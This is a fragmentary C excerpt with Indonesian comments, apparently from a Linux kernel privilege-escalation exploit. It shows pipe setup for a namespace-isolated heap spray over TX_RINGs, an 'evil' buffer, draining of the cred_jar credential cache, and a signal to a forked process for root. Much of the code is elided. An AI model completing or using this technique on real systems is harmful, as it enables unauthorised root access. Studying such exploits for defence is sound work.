...
int main(int argc, char **argv)
{
    ...
    // untuk berkomunikasi dengan penyemprotan di namespace terpisah melalui TX_RINGs
    pipe(sprayfd_child);
    pipe(sprayfd_parent);
    ...
    // untuk berkomunikasi dengan fork nanti
    pipe(rootfd);

    char evil[CHUNK_SIZE];
    memset(evil, 0, sizeof(evil));

    // menguras cred_jar pada order 0
    ...
    *(uint32_t*)&evil[CHUNK_SIZE-0x6] = 1;
    ...
    puts("memberitahu fork bahwa spraying telah selesai");
